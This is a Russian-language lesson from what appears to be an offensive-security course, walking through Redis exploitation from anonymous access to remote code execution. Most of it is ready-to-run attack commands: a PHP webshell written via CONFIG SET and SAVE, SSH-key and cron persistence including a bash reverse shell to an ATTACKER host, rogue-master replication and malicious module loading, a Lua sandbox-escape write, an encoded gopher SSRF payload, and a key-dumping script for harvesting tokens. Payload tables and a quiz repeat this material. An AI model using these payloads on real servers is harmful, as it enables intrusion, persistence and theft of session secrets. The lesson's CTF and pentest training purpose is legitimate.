---
id: db-redis
title: "Redis: анонимный доступ, запись файлов и RCE"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 2
tags: [redis, nosql, rce, config, bgsave, module, replication, ssrf, gopher]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 55
summary: "Redis от PING до RCE: анонимный доступ на 6379, дамп ключей, webshell через CONFIG+SAVE, запись authorized_keys/cron, MODULE LOAD, master-slave replication и SSRF через gopher."
---

Redis — это не только кэш, но и очередь, хранилище сессий, брокер и «база данных в памяти». У него текстовый протокол (RESP), нет схемы и — исторически — нет аутентификации. Если порт 6379 открыт, вы управляете сервером напрямую: читаете ключи, меняете конфиг, **пишете произвольные файлы на диск** и тем самым получаете webshell, доступ по SSH или задачу в cron. Даже если порт закрыт снаружи, Redis часто доступен приложению через **SSRF** — тогда его атакуют через `gopher://`.

## Порт, фингерпринт и версия

Redis слушает **6379** (иногда 6380 для TLS). Проверка одной командой:

```bash
redis-cli -h target -p 6379 PING
# PONG  -> открыт, аутентификации нет
# (error) NOAUTH Authentication required.  -> пароль задан
```

Если `redis-cli` недоступен — годится `nc` (протокол текстовый):

```bash
printf 'PING\r\n' | nc -w3 target 6379
printf 'INFO server\r\n' | nc -w3 target 6379 | head
nmap -sV -p 6379 target
# 6379/tcp open  redis  Redis key-value store 7.0.11
```

`INFO` отдаёт версию, ОС, путь конфига и число ключей — это ваша карта:

```bash
redis-cli -h target INFO server | grep -E 'redis_version|os|config_file'
redis-cli -h target INFO keyspace   # db0:keys=1240,expires=12
```

## Анонимный доступ: PING, INFO, CONFIG GET

Когда `requirepass` не задан, вы — полноправный клиент. Первым делом смотрим конфиг и состояние.

```bash
redis-cli -h target CONFIG GET dir          # рабочий каталог -> 1) "dir" 2) "/var/lib/redis"
redis-cli -h target CONFIG GET dbfilename   # имя файла дампа -> "dump.rdb"
redis-cli -h target CONFIG GET requirepass  # пусто -> пароля нет
redis-cli -h target CONFIG GET maxmemory
redis-cli -h target INFO replication        # роль: master/slave
redis-cli -h target CLIENT LIST             # кто подключён
redis-cli -h target DBSIZE                  # сколько ключей
```

`CONFIG SET` пишет конфиг (в рантайме). Это и есть рычаг для RCE — см. ниже.

## Ключи и дамп: KEYS, SCAN, TYPE, GET, HGETALL

Сначала перечисляем ключи, потом читаем значения по типу.

```bash
redis-cli -h target KEYS '*'                 # все ключи (на проде может подвиснуть)
redis-cli -h target --scan --pattern '*'     # безопаснее: SCAN
redis-cli -h target TYPE session:abc         # string|hash|list|set|zset|stream
redis-cli -h target GET session:abc          # строка
redis-cli -h target HGETALL user:1           # хэш (профили, сессии)
redis-cli -h target LRANGE queue 0 -1        # список
redis-cli -h target SMEMBERS tags            # множество
```

Массовый дамп:

```bash
# все строковые ключи разом
redis-cli -h target --scan | while read k; do
  t=$(redis-cli -h target TYPE "$k")
  [ "$t" = "string" ] && echo "$k = $(redis-cli -h target GET "$k")"
done | tee redis_dump.txt

# ищем секреты/токены
grep -iE 'pass|token|secret|jwt|session|api' redis_dump.txt
```

## Webshell через CONFIG SET + dbfilename + BGSAVE

Идея: Redis умеет писать **RDB-дамп** в файл по пути `dir`/`dbfilename`. Мы меняем `dir` на веб-корень, `dbfilename` на `.php`, кладём в ключ PHP-код и заставляем Redis сохранить дамп — получаем webshell.

```bash
redis-cli -h target CONFIG SET dir /var/www/html
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET x '<?php system($_GET["c"]); ?>'
redis-cli -h target SAVE          # или BGSAVE — записать дамп сейчас

# проверяем
curl -s 'https://target/shell.php?c=id'
# uid=33(www-data) gid=33(www-data)
```

`SAVE` блокирует сервер, `BGSAVE` — в фоне. RDB-файл имеет заголовок `REDIS...`, поэтому код ставят в начало ключа или используют `--rdb-compression no` (в свежих версиях RDB может сжиматься — тогда webshell может не сработать, пробуйте обе команды).

## Запись authorized_keys и cron

Тот же приём — но пишем не webshell, а файл, который даёт исполнение.

**SSH-ключ:**

```bash
# сначала на своей машине
ssh-keygen -t ed25519 -f ./id_redis -N ''
cat ./id_redis.pub

redis-cli -h target CONFIG SET dir /root/.ssh
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET x '\n\nssh-ed25519 AAAA...yourkey... redis@attacker\n\n'
redis-cli -h target SAVE

ssh -i ./id_redis root@target
```

**Cron:**

```bash
redis-cli -h target CONFIG SET dir /var/spool/cron
redis-cli -h target CONFIG SET dbfilename root
redis-cli -h target SET x '\n\n* * * * * bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"\n\n'
redis-cli -h target SAVE
# ждём минуту -> reverse shell
```

Альтернативные каталоги для cron: `/etc/cron.d/` (файл `root`), `/var/spool/cron/crontabs/`. Проверяйте, куда есть права на запись (обычно Redis бежит от `redis`, но с правами на `/var/www` и иногда root).

## MODULE LOAD: загрузка вредоносного .so

Redis с версии 4.0 поддерживает модули — нативные `.so`, которые могут делать что угодно. Если `enable-module-command` не запрещён, вы загружаете свой модуль.

```bash
# на своей машине собрать модуль (RedisModules-ExecuteCommand / redis-rogue-server)
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand && make
# получаем module.so

# залить на цель: через CONFIG+SAVE в каталог, куда есть запись, либо через загрузку по HTTP
redis-cli -h target CONFIG SET dir /tmp
redis-cli -h target CONFIG SET dbfilename module.so
# (здесь нужен способ положить бинарь; часто уже лежит в /tmp или подтягивается slave-репликацией)

redis-cli -h target MODULE LOAD /tmp/module.so
redis-cli -h target system.exec 'id'
# uid=0(root) gid=0(root)
```

Проверка доступности команды:

```bash
redis-cli -h target MODULE LIST
redis-cli -h target MODULE LOAD /path/to/exp.so
```

## Master-Slave replication RCE

Самый надёжный путь без прав на запись в веб-корень: заставляем Redis считать **наш** сервер мастером, он подтягивает RDB-модуль и загружает его.

```bash
# на своей машине запустить rogue-сервер, отдающий module.so
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server && python3 redis-rogue-server.py --rhost target --rport 6379 --lhost ATTACKER --lport 21000

# вручную:
redis-cli -h target SLAVEOF ATTACKER 21000   # цель тянет RDB от нас
redis-cli -h target MODULE LOAD ./exp.so
redis-cli -h target SLAVEOF NO ONE
```

`SLAVEOF` (в новых версиях `REPLICAOF`) заставляет цель подключиться к вашему серверу и загрузить дамп, внутри которого — модуль. Дальше `MODULE LOAD`.

## Lua EVAL

Redis встроенно исполняет Lua. `EVAL` сам по себе не даёт RCE (песочница), но полезен для обхода ограничений и иногда — для записи файлов через `os`/`io` при незакрытой песочнице.

```bash
redis-cli -h target EVAL "return redis.call('GET','session:abc')" 0
redis-cli -h target EVAL "return #redis.call('KEYS','*')" 0
redis-cli -h target EVAL "return redis.call('CONFIG','GET','dir')" 0

# исторически: побег из песочницы (проверяйте на конкретной версии)
redis-cli -h target EVAL "local f=io.open('/tmp/pwn','w'); f:write('x'); f:close(); return 1" 0
```

`EVAL` удобен для скриптовых дампов и как «универсальный вызов» внутри SSRF-пейлоада.

## SSRF в Redis через gopher

Если Redis недоступен извне, но приложение уязвимо к SSRF, отправляем RESP-команды через `gopher://`. Каждая строка заканчивается `%0d%0a` (CRLF).

```
gopher://127.0.0.1:6379/_PING%0d%0A
gopher://127.0.0.1:6379/_SET%20x%20%22%3C%3Fphp%20system(%24_GET%5B%22c%22%5D)%3B%20%3F%3E%22%0d%0ACONFIG%20SET%20dir%20/var/www/html%0d%0ACONFIG%20SET%20dbfilename%20s.php%0d%0ASAVE%0d%0A
```

Расшифровка: `SET x "<php код>"`, `CONFIG SET dir /var/www/html`, `CONFIG SET dbfilename s.php`, `SAVE`. Тот же webshell, но через HTTP-запрос к SSRF-эндпоинту. Для CRLF-инъекции иногда достаточно `dict://` или `gopher://`.

## Разобранный пример: от PING до webshell

Цель: `target:6379` открыт.

```bash
# Шаг 1. Анонимный доступ
redis-cli -h target PING              # PONG

# Шаг 2. Карта
redis-cli -h target INFO keyspace
redis-cli -h target CONFIG GET dir
# 1) "dir"  2) "/var/lib/redis"

# Шаг 3. Ищем веб-корень (по процессам/типичным путям)
redis-cli -h target CONFIG SET dir /var/www/html   # (OK)

# Шаг 4. Пишем webshell
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET x '<?php system($_GET["c"]); ?>'
redis-cli -h target SAVE

# Шаг 5. Выполняем команду
curl -s 'https://target/shell.php?c=id'
# uid=33(www-data)

# Шаг 6. Если запись в webroot запрещена — SSH-ключ
redis-cli -h target CONFIG SET dir /root/.ssh
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET x '\n\nssh-ed25519 AAAA... redis\n\n'
redis-cli -h target SAVE
ssh -i ./id_redis root@target
```

## Частые ошибки

- **`SAVE` на большом датасете.** `SAVE` блокирует сервер; предпочитайте `BGSAVE`, но учитывайте, что он пишет в фон и файл появляется чуть позже.
- **Сжатие RDB.** Начиная с некоторых версий дамп сжимается, и PHP-код может «испортиться» — тогда webshell не выполнится; пробуйте `CONFIG SET rdbcompression no` или ставьте код в самое начало.
- **Права на каталог.** Redis пишет от пользователя `redis`; `/root/.ssh` и `/var/spool/cron` доступны не всегда — проверяйте `dir` и пробуйте `/var/www`, `/tmp`, `/home/*`.
- **`dbfilename` не может содержать `/`.** Указывайте только имя файла; путь задаётся через `dir`.
- **`MODULE LOAD` отключён.** С версии 7 `enable-module-command` по умолчанию `no`; тогда идите через `SLAVEOF`+RDB или webshell.
- **Забыть про `requirepass`.** Если `PING` вернул `NOAUTH`, все команды требуют `AUTH <пароль>`; пароль часто утекает из конфига приложения.
- **Разрушительность.** `FLUSHALL`, `FLUSHDB`, `CONFIG SET appendonly` меняют данные/поведение продакшена — не выполняйте без согласования.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, дамп ключей, запись файлов/RCE и ACL/привилегии.

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `PING` | живость + наличие пароля | `redis-cli -h target PING` → `PONG` / `NOAUTH` |
| `INFO server` | версия, ОС, `config_file` | `redis-cli -h target INFO server` |
| `INFO keyspace` | базы и число ключей | → `db0:keys=1240,expires=12` |
| `INFO all` | полный статус | `redis-cli -h target INFO all` |
| `INFO replication` | роль master/slave, реплики | |
| `DBSIZE` | число ключей | `redis-cli -h target DBSIZE` |
| `CLIENT LIST` | подключённые клиенты | |
| `COMMAND COUNT` | число доступных команд | |
| `COMMAND DOCS` | документация команд | |
| `CONFIG GET *` | весь конфиг | `redis-cli -h target CONFIG GET '*'` |
| `nmap -sV -p 6379` | баннер/версия | `nmap -sV -p 6379 target` → `Redis key-value store 7.0.11` |
| `nc` (RESP) | проверка без клиента | `printf 'PING\r\n' \| nc -w3 target 6379` |

### (б) Клиентский CLI (redis-cli)

| Команда/флаг | Что делает | Пример |
|--------------|-----------|--------|
| `-h H -p 6379` | подключиться | `redis-cli -h target -p 6379` |
| `-a PASS` | пароль | `redis-cli -h target -a secret` |
| `--user U --pass P` | ACL-пользователь | `redis-cli --user admin --pass p` |
| `-n DB` | выбрать базу | `redis-cli -h target -n 1` |
| `--scan --pattern '*'` | безопасное перечисление ключей | `redis-cli -h target --scan --pattern 'sess:*'` |
| `--bigkeys` | крупнейшие ключи | `redis-cli -h target --bigkeys` |
| `--rdb out.rdb` | скачать RDB-дамп | `redis-cli -h target --rdb ./dump.rdb` |
| `--pipe` | массовая загрузка команд | `redis-cli -h target --pipe < cmds.txt` |
| `--eval script.lua` | выполнить Lua-скрипт | `redis-cli -h target --eval s.lua` |
| `--raw` / `--no-raw` | вывод «как есть» / с экранированием | `redis-cli --raw -h target GET k` |
| `-c` | следовать редиректам в кластере | |
| `--tls` | TLS | |
| `--latency` | замер задержки | |
| `AUTH PASS` | аутентификация | `redis-cli -h target AUTH secret` |
| `SELECT 1` | выбрать БД | |
| `CONFIG GET dir` / `CONFIG SET dir X` | читать/писать конфиг | `CONFIG SET dir /var/www/html` |
| `DBSIZE` / `TYPE k` / `TTL k` | размер/тип/TTL ключа | |

### (в) Дамп ключей по типам

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `KEYS *` | все ключи (осторожно на проде) | `redis-cli -h target KEYS '*'` |
| `SCAN 0 MATCH * COUNT 1000` | курсорное перечисление | `redis-cli -h target --scan --pattern '*'` |
| `GET k` | значение строки | `GET session:abc` |
| `MGET k1 k2` | несколько строк | |
| `HGETALL h` | весь хэш | `HGETALL user:1` |
| `HKEYS h` / `HVALS h` | поля/значения хэша | |
| `LRANGE l 0 -1` | весь список | `LRANGE queue 0 -1` |
| `SMEMBERS s` | элементы множества | `SMEMBERS tags` |
| `ZRANGE z 0 -1 WITHSCORES` | сортированное множество | |
| `XRANGE stream - +` | записи stream | |
| `GETRANGE k 0 -1` | подстрока | |
| `DUMP k` | сериализованное значение | |
| `OBJECT ENCODING k` | внутренняя кодировка | |
| `MEMORY USAGE k` | память ключа | |
| `DEBUG OBJECT k` | отладочная информация | |
| `--rdb` | выгрузить весь RDB | `redis-cli -h target --rdb ./dump.rdb` |

### (г) Запись файлов и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `CONFIG SET dir P` | сменить каталог дампа | `CONFIG SET dir /var/www/html` |
| `CONFIG SET dbfilename F` | сменить имя файла дампа | `CONFIG SET dbfilename shell.php` |
| `SET x payload` + `SAVE`/`BGSAVE` | записать RDB → webshell/файл | `SET x '<?php system($_GET["c"]); ?>'; SAVE` |
| `CONFIG SET dir /root/.ssh` + `dbfilename authorized_keys` | записать SSH-ключ | `SET x '\n\nssh-ed25519 AAAA... \n\n'; SAVE` |
| `CONFIG SET dir /var/spool/cron` + `dbfilename root` | записать cron-задачу | `SET x '\n\n* * * * * bash -i >& /dev/tcp/A/4444 0>&1\n\n'; SAVE` |
| `MODULE LOAD /path/exp.so` | загрузить нативный модуль → RCE | `MODULE LOAD /tmp/module.so; system.exec 'id'` |
| `SLAVEOF A P` / `REPLICAOF A P` | заставить тянуть RDB с attacker | `SLAVEOF 10.0.0.9 21000` |
| `SLAVEOF NO ONE` | вернуть в master | |
| `EVAL "lua" 0` | выполнить Lua (песочница) | `EVAL "return redis.call('GET','k')" 0` |
| `EVAL "io.open(...)"` | исторический побег из песочницы | `EVAL "local f=io.open('/tmp/pwn','w');f:write('x');f:close();return 1" 0` |
| `CONFIG SET requirepass P` | поставить пароль | `CONFIG SET requirepass secret` |
| `CONFIG REWRITE` | записать конфиг на диск | |
| `CONFIG SET appendonly yes` | включить AOF | |
| `ACL SETUSER u on >pass ~* +@all` | создать всемогущего пользователя | |
| `gopher://` SSRF | RESP-команды через SSRF | `gopher://127.0.0.1:6379/_SET%20x%20...%0d%0ASAVE%0d%0A` |

### (д) ACL, привилегии, безопасность

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `ACL WHOAMI` | текущий пользователь | `redis-cli -h target ACL WHOAMI` → `default` |
| `ACL LIST` | все пользователи и их права | `ACL LIST` |
| `ACL GETUSER default` | права конкретного | `ACL GETUSER default` |
| `ACL CAT` | категории команд | `ACL CAT dangerous` |
| `CONFIG GET requirepass` | есть ли пароль | → пусто = нет |
| `MODULE LIST` | загруженные модули | |
| `COMMAND INFO CONFIG` | метаданные команды | |
| `CONFIG SET protected-mode no` | снять защиту (если bind публичный) | |
| `CLIENT KILL` | убить соединения | |
| `MONITOR` | поток команд в реальном времени | `redis-cli -h target MONITOR` |
| `CONFIG SET rename-command` | (в конфиге) отключить опасные команды | hardening: `rename-command FLUSHALL ""` |
| Опасные команды | требуют осторожности | `FLUSHALL`, `FLUSHDB`, `KEYS`, `CONFIG SET`, `DEBUG` |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какой порт по умолчанию у Redis?"
  options:
    - "27017"
    - "6379"
    - "9200"
    - "11211"
  answer: 1
  explanation: "6379 — Redis; 27017 — MongoDB, 9200 — Elasticsearch, 11211 — Memcached."
- question: "Какая пара команд меняет каталог и имя файла RDB-дампа?"
  options:
    - "SET dir и SET file"
    - "CONFIG SET dir и CONFIG SET dbfilename"
    - "SAVE и BGSAVE"
    - "MODULE SET и LOAD"
  answer: 1
  explanation: "CONFIG SET dir задаёт каталог, CONFIG SET dbfilename — имя файла дампа."
- question: "Какая команда немедленно записывает дамп на диск?"
  options:
    - "PERSIST"
    - "SAVE"
    - "FLUSHALL"
    - "KEYS"
  answer: 1
  explanation: "SAVE пишет RDB синхронно; BGSAVE — в фоне. Именно запись дампа кладёт webshell на диск."
- question: "Как загрузить вредоносный нативный модуль в Redis?"
  options:
    - "EVAL 'load()'"
    - "MODULE LOAD /path/exp.so"
    - "SLAVEOF module"
    - "CONFIG LOAD module"
  answer: 1
  explanation: "MODULE LOAD подключает .so, который может выполнять команды (например, system.exec)."
- question: "Через какой протокол SSRF-эндпоинт говорит с Redis на 127.0.0.1?"
  options:
    - "gopher"
    - "ldap"
    - "ftp"
    - "smb"
  answer: 0
  explanation: "gopher:// позволяет передать произвольные байты, в т.ч. RESP-команды с CRLF."
```

## Где пригодится

- **CTF (Web):** «открытый Redis» — классика; webshell через CONFIG+SAVE решается за минуты.
- **Bug bounty:** Redis, торчащий в интернет или достижимый через SSRF, — critical; демонстрация записи файла = бесспорный PoC.
- **Пентест:** Redis часто держит сессии и токены приложения — дамп ключей ведёт к захвату аккаунтов.
- **Работа (AppSec):** hardening Redis (bind 127.0.0.1, `requirepass`, `rename-command`, `enable-module-command no`) — прямой вывод из этих атак.
